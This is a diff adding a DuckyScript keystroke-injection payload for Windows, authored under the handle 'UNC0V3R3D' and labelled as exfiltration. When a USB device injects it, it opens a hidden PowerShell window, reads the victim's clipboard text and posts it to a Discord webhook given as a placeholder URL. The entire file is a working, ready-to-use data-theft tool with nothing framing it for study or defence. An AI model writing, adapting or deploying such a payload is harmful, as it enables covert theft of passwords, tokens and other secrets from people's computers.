@@ -1,0 +1,29 @@
+REM Author: UNC0V3R3D
+REM Description: Grabs current clipboard contents and sends them to a Discord webhook.
+REM Version: 1.0
+REM Category: Exfiltration
+REM Target: Windows 10/11
+REM Requirements: Internet connection, Discord webhook URL
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1500
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+DELAY 400
+STRING $clip = [System.Windows.Forms.Clipboard]::GetText()
+ENTER
+STRING if (-not $clip) { $clip = '[Clipboard is empty or non-text]' }
+ENTER
+STRING $wh = 'DISCORD_WEBHOOK_URL'
+ENTER
+STRING $body = @{ content = "**Clipboard Contents:**`n``````$clip``````" } | ConvertTo-Json
+ENTER
+STRING Invoke-RestMethod -Uri $wh -Method Post -Body $body -ContentType 'application/json'
+ENTER
+DELAY 2000
+STRING exit
+ENTER
+REM End of payload
